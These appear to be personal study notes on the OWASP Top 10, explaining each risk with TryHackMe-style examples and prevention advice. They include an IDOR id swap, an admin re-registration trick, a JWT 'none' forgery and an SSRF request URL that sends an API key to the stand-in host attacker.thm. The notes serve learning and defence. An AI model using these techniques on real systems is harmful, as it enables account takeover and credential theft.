![[Screenshot from 2024-09-18 23-21-01.png]]

The **Open Web Application Security Project (OWASP)** is a *non-profit foundation dedicated to improving software security*.
- it provides tools, documentation, and resources to help developers, security professionals, and organization create secure web
- OWASP's goal is to raise awareness about the most common and critical security risks and how to mitigate them

---

# 1. Broken Access Control


> [!NOTE] 
> Improperly enforced restrictions on what authenticated users can do, allowing them to access resources or perform actions they shouldn't


Website have pages that are protected from regular visitors
- For example, only the site's admin user should be able to access a page to manage other users
If a website visitor can access protected pages that are not meant to see, then the access controls are broken

A regular visitor being able to access protected pages can lead to the following :
- Being able to view sensitive information from other users
- Accessing unauthorized functionality

Simply put, broken access control allows attackers to bypass *authorization*, allowing them to view sensitive data to perform tasks they aren't supposed to 

For example, a [vulnerability was found in 2019](https://bugs.xdavidhu.me/google/2021/01/11/stealing-your-private-videos-one-frame-at-a-time/), where an attacker could get any single frame from a Youtube video marked as private. The researcher who found the vulnerability showed that he could ask for several frames and somewhat reconstruct the video. Since the expectation from a user when marking a video as private would be that nobody had access to it, this was indeed accepted as a broken access control vulnerability.

#### Prevention : 
- Implement proper RBAC and ensure sensitive data is protected by authorization mechanisms

## Broken Access Control (IDOR)
- IDOR stands for *Insecure Direct Object Reference*

> [!NOTE]
> refers to an access control vulnerability where you can use resources you wouldn't ordinarily be able to see

- This occurs when the programmer exposes a *Direct Object Reference*
	- which is just an identifier that refers to specific objects within the server 
	- By object, we could mean a file, a user, a bank account in a banking application, or anything really

e.g. let's say we're logging into our bank account, and after correctly authenticating ourselves, we get taken to a URL like this `https://bank.thm/account?id=111111`. On that page, we can see all our important bank details, and a user would do whatever they need to do and move along their way, thinking nothing is wrong

![[Screenshot from 2024-09-18 23-21-01.png]]

There is, however, a potentially huge problem here, anyone may be able to change the `id` parameter to something else like `222222`, and if the site is incorrectly configured, then he would have access to someone else's bank information.

![[Screenshot from 2024-09-19 15-48-48.png]]

The application exposes a direct object reference through the `id` parameter in the URL, which points to specific accounts. 

Since the application isn't checking if the logged-in user owns the referenced account, an attacker can get sensitive information from other users because of the IDOR vulnerability. Notice that direct object references aren't the problem, but rather that the application doesn't validate if the logged-in user should have access to the requested account.


---

# 2. Cryptographic Failures
- formerly called "**Sensitive Data Exposure**"

> [!NOTE]
> Insufficient protection of sensitive data, such as passwords or credit card details, typically due to weak encryption or improper implementation

- refers to any vulnerability arising from the misuse (or lack of use) of cryptographic algorithms for protecting sensitive information
	- Storing sensitive data without encryption
	- using outdated algorithms like MD5 or SHA1
- Data encryption is mainly of two types 
	- Encrypting data in transit
	- Encrypting data at rest

The most common ways to store large amounts of data in a format easily accessible from many locations is in a database. Database engines usually follow the Structured Query Language (SQL) syntax

In a production environment, it is common to see databases set up on dedicated servers running a database service such as MySQL or MariaDB; however, databases can also be stored as files. 
- These are referred to as "flat-file" databases, as they are stored as a single file on the computer. 
- This is much easier than setting up an entire database server and could potentially be seen in smaller web applications. 
Usually this is not a problem, but what if the database is stored underneath the root directory of the website (i.e. one of the files is accessible to the user connecting to the website)
The most common (and simplest) format of a flat-file database is an [[SQLite]] database

#### Prevention
- Use strong encryption standards (e.g. AES-256) and ensure TLS is correctly configured for data transmission

---

# 3. Injection

> [!NOTE]
> When untrusted data is sent to an interpreter as part of a command or query

These flaws occur because the application interprets user-controlled inputs as commands or parameters
Injection attacks depends on what technologies are used and how these technologies interpret the input
- An attacker manipulating a query by injecting SQL code through input fields
- The most common types include SQL injections, LDAP injections, and OS command injections
some common examples of injections include the following : 
- SQL Injection
	- This occurs when user-controlled input is passed to SQL queries
	- As a result an attacker can pass in SQL queries to manipulate the outcome of such queries, potentially allowing access, modification and deletion of information when this input is passed into database queries
- Command Injection
	- This occurs when user input is passed to system commands
	- as a result an attacker execute arbitrary system commands on application servers, potentially allowing them to access users' systems

#### Prevention
- Implement secure design patterns, and conduct threat modeling during the design phase

The main defense for preventing injection attacks is ensuring that user-controlled input is not interpreted as queries of commands. There are different ways of doing this : 
- Using an allow list : 
	- when input is sent to the server, this input is compared to a list of safe inputs or characters
	- only if the input is marked as safe then it is processed, otherwise the system throws an error
- Stripping input :
	- If the input contains dangerous characters, these are removed before processing

## Command Injection
occurs when server-side code (like PHP) in a web application makes a call to a function that interacts with the server's console directly. 
- An injection web vulnerability allows an attacker to take advantage of that call to execute operating system commands arbitrarily on the server. Once the attacker has a foothold on the web server, they can start the usual enumeration of your systems and look for ways to pivot around.



---

# 4. Insecure Design

> [!NOTE]
> Flaws in application architecture that opens it up to vulnerabilities

- refers to vulnerabilities which are inherent to the application's architecture
	- They are not vulnerabilities regarding bad implementations or configurations, but the idea behind the whole application (or a part of it) is flawed from the start
- occurs mostly due to improper threat modelling during the planning phase
- insecure design vulnerabilities may also be introduced by developers while adding some "shortcuts" around the code to make their testing easier 
	- A developer could, for example, disable the OTP validation in the development phases to quickly test the rest of the app without manually inputting a code at each login but forget to re-enable it when sending the application to production
- These are issues that often arise during the design phase 
	- e.g. not considering security principles during the design of the application's workflows

## Insecure Password Reset
- A while ago, Instagram allowed users to reset their forgotten password by sending them a 6-digit code to their mobile number via SMS for validation. To prevent brute forcing the OTP a rate limit was applied
- However, it was found that the rate-limiting only applied to code attempts made from the same IP
- *Notice how the vulnerability is related to the idea that no user would be capable of using thousands of IP addresses to make concurrent requests to try and brute-force a numeric code*. The problem is in the design rather than the implementation of the application in itself

#### Prevention
- Implement secure design patterns, and conduct threat modelling during the design phase

---

# 5. Security Misconfiguration

> [!NOTE]
> Incorrect Configurations or settings that leave applications, servers, or databases vulnerable

- different from the other Top 10, cause they occur when security could have been appropriately configured but was not
- Even if up-to-date software is used, poor configurations could make your installation vulnerable
- It could be unnecessary features being enabled or poorly configured security controls
	- using default passwords
	- leaving debugging enabled in production 
	- not configuring secure HTTP headers
- Security misconfigurations include:
	- Poorly configured permissions on cloud services, like S3 buckets.
	- Having unnecessary features enabled, like services, pages, accounts or privileges.
	- Default accounts with unchanged passwords.
	- Error messages that are overly detailed and allow attackers to find out more about the system.
	- Not using HTTP security headers

## Debugging Interfaces
A common security misconfiguration concerns the exposure of debugging features in production software.
- Debugging features are often available in programming frameworks to allow the developers to access advanced functionality that is useful for debugging 
- Attackers could abuse some of those debug functionality if somehow, the developers forgot to disable them before publishing their application

#### Prevention
- Automate security configurations
- perform regular audits
- disable features that aren't required 

---

# 6. Vulnerable and Outdated Components

> [!NOTE]
> Using Components with known vulnerabilities, such as outdated libraries, frameworks, or other software modules

- e.g. an attacker exploiting a know vulnerability in a third-party library that your web app relies on

#### Prevention
- Keep software dependencies up to date and avoid using components with knows security issues

---

# 7. Identification and Authentication Failures

> [!NOTE]
> Weak authentication mechanisms that allow attackers to impersonate users, bypass authentication, or use stolen credentials

- Authentication and session management constitute core components or modern web applications 
- Upon authentication server would then provide the users' browser with a session cookie
	- needed because web servers use HTTP(S) communication, which is stateless. Attaching cookies means the server knows who is sending the data
	- The server can keep track of users' actions
- Some common flaws in authentication mechanisms include the following : 
	- Brute force attacks 
	- Use of Weak Credentials
		- web applications should set strong password policies
	- Weak Session Management
		- If session cookies contain predictable values, attackers can set their own session cookies and access user's accounts

#### Prevention
- Implement strong authentication controls
- use MFA
- ensure sessions tokens are secure
- To avoid password-guessing attacks, ensure the application enforces a strong password policy. 
- To avoid brute force attacks, ensure that the application enforces an automatic lockout after a certain number of attempts. This would prevent an attacker from launching more brute-force attacks.

## Identification and Authentication Failures Practical Example
Many times, what happens is that developers forget to sanitise the input(username & password) given by the user in the code of their application, which can make them vulnerable to attacks like SQL injection. Here, we will focus on a vulnerability that happens because of a developer's mistake but is very easy to exploit, i.e. re-registration of an existing user.

Let's understand this with the help of an example, say there is an existing user with the name `admin`, and we want access to their account, so what we can do is try to re-register that username but with slight modification. We will enter " admin" without the quotes (notice the space at the start). Now when you enter that in the username field and enter other required information like email id or password and submit that data, it will register a new user, but that user will have the same right as the admin account. That new user will also be able to see all the content presented under the user `admin`.


---

# 8. Software and Data Integrity Failures

> [!NOTE]
> Vulnerabilities introduced by using untrusted software

- relying on insecure CI/CD pipelines or downloading packages from unverified sources 
- an attacker injecting malicious code into a software update of open-source package

#### Prevention\
- Use Signed software updates
- validate integrity of external software
- ensure your CI/CD pipelines is secure

## Software Integrity Failures
Suppose you have a website that uses third-party libraries that are stored in some external servers that are out of your control. While this may sound a bit strange, this is actually a somewhat common practice. Take as an example jQuery, a commonly used javascript library. If you want, you can include jQuery in your website directly from their servers without actually downloading
- The problem is that if an attacker somehow hacks into the jQuery official repository, they could change the contents of `https://code.jquery.com/jquery-3.6.1.min.js` to inject malicious code
- Modern browsers allow you to specify a hash along the library's URL so that the library code is executed only if the hash of the downloaded file matches the expected value. 
- This security mechanism is called *Subresource Integrity (SRI)*
You can go to [https://www.srihash.org/](https://www.srihash.org/) to generate hashes for any library if needed.

## Data Integrity Failure
**Cookies** are key-value pairs that a web application will store on the user's browser and that will be automatically repeated on each request to the website that issued them. E.g. if a username is stored in the cookies, in subsequent requests the browser would always send your username in the cookies so that your web application knows what user is connecting. This would be a terrible idea security-wise because cookies are stored on the user's browser, so if the user tampers with the cookies and changes the username, they could potentially impersonate someone else and read their emails or something.
- This application would suffer from a data integrity failure, as it trusts data that an attacker can tamper with 

One solution to maintain data integrity while avoiding re-inventing the wheel, we could use some token implementation that allows you to do this and deal with all of the cryptography to provide proof of integrity without you having bother with it, is *JSON Web Tokens (JWT)*

JWTs are very simple tokens that allow you to store key-value pairs on a token that provides integrity as part of the token. 
- The idea is that you can generate tokens that you can give your users with the certainty that they won't be able to alter the key-value pairs and pass the integrity check. 

#### TryHackMe example :

##### JWT and the None Algorithm
A data integrity failure vulnerability was present on some libraries implementing JWTs a while ago. As we have seen, JWT implements a signature to validate the integrity of the payload data. The vulnerable libraries allowed attackers to bypass the signature validation by changing the two following things in a JWT:
1. Modify the header section of the token so that the `alg` header would contain the value `none`.
2. Remove the signature part.
Taking the JWT from before as an example, if we wanted to change the payload so that the username becomes "admin" and no signature check is done, we would have to decode the header and payload, modify them as needed, and encode them back. Notice how we removed the signature part but kept the dot at the end.

![[Screenshot from 2024-09-28 15-13-57.png]]




---

# 9. Security Logging and Monitoring Failures

> [!NOTE]
> The lack of Logging or monitoring for security events, leading to missed detection of attacks or incidents

- A failure to log suspicious login attempts or no monitoring of server errors that indicate attacks

Without logging, there would be no way to tell what actions were performed by an attacker if they gain access to particular web applications. The more significant impacts of these include: 
- **Regulatory damage:** if an attacker has gained access to personally identifiable user information and there is no record of this, final users are affected, and the application owners may be subject to fines or more severe actions depending on regulations.
- **Risk of further attacks:** an attacker's presence may be undetected without logging. This could allow an attacker to launch further attacks against web application owners by stealing credentials, attacking infrastructure and more.

The information stored in logs should include the following:
- HTTP status codes
- Time Stamps
- Usernames
- API endpoints/page locations
- IP addresses

#### Prevention
- Ensure logging is enabled for all critical events
- implement monitoring systems to detect attacks and anomalies

---

# 10. Server-Side Request Forgery (SSRF)

> [!NOTE]
> This occurs when an application fetches a remote resource based on user input but doesn't validate the user-provided URL

This type of vulnerability occurs when an attacker can coerce a web application into sending requests on their behalf to arbitrary destinations while having control of the contents of the request itself
- SSRF vulnerabilities often arise from implementations where our web application needs to use third-party services.

![[Screenshot from 2024-09-28 15-55-19.png]]

- An attacker tricking the server into making requests to internal services or external malicious sites
By looking at the diagram above, it is easy to see where the vulnerability lies. The application exposes the `server` parameter to the users, which defines the server name of the SMS service provider. If the attacker wanted, they could simply change the value of the `server` to point to a machine they control, and your web application would happily forward the SMS request to the attacker instead of the SMS provider. As part of the forwarded message, the attacker would obtain the API key, allowing them to use the SMS service to send messages at your expense. To achieve this, the attacker would only need to make the following request to your website:

`https://www.mysite.com/sms?server=attacker.thm&msg=ABC`

This would make the vulnerable web application make a request to:

`https://attacker.thm/api/send?msg=ABC` 

You could then just capture the contents of the request using Netcat

#### Prevention
- Validate and sanitize all URLs before fetching resources, and restrict access to internal services

---

# Other OWASP Tools and Resources

#### OWASP Juice Shop
- A deliberately vulnerable web application designed for security professionals to practice hacking techniques and identify security issues

#### OWASP Risk Rating Methodology
- This provides a framework for rating the severity of security risks based on factors like likelihood and impact

#### OWASP Web Security Testing Guide (WSTG)
- A comprehensive manual for testing the security of web application

---

## How to Use OWASP Resources
- **For Developers**: OWASP provides actionable security guidelines and best practices to help developers write secure code.
- **For Penetration Testers**: OWASP tools like ZAP and the WSTG are invaluable resources for testing applications for security flaws.
- **For Organizations**: OWASP frameworks like SAMM and ASVS can be used to assess the security maturity of your organization and ensure that security is integrated throughout the development lifecycle.